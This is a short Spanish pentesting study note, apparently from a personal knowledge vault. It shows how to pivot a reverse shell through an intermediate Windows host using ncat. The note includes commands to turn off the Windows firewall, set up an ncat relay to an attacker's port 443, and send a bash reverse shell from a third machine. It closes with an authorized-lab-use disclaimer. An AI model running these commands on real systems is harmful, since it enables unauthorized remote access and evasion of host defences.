---
title: "Reverse Shell ncat en Windows"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

En windows, en vez de usar socat podemos usar ncat para permitir el tráfico de una reverse shell por parte de una máquina 3 pasando por una máquina windows intermedia. Por ejemplo, desde el Kali nos ponemos a la escucha:
![[Pasted image 20240303120530.png]]
A continuación, en la máquina intermedia podemos desactivar el firewall para evitar tener problemas:
```bash
netsh advfirewall set allprofiles state off
```
![[Pasted image 20240303154211.png]]
Ahora desde la máquina Windows intermedia decimos que todo el tráfico que recibamos por ejemplo por el puerto 1111 lo vamos a enviar al puerto 443 de la máquina atacante:
```bash
ncat -l -p 1111 -c "ncat 192.168.0.20 443"
```
![[Pasted image 20240303120641.png]]
Entonces ahora desde la máquina 3 enviamos la reverse shell a la máquina windows 7 intermedia por el puerto 1111 y deberíamos de recibir la conexión en nuestro Kali:
```bash
nc -c bash 10.10.10.129 1111
```
![[Pasted image 20240303120735.png]]
Y recibimos la conexión:
![[Pasted image 20240303120747.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
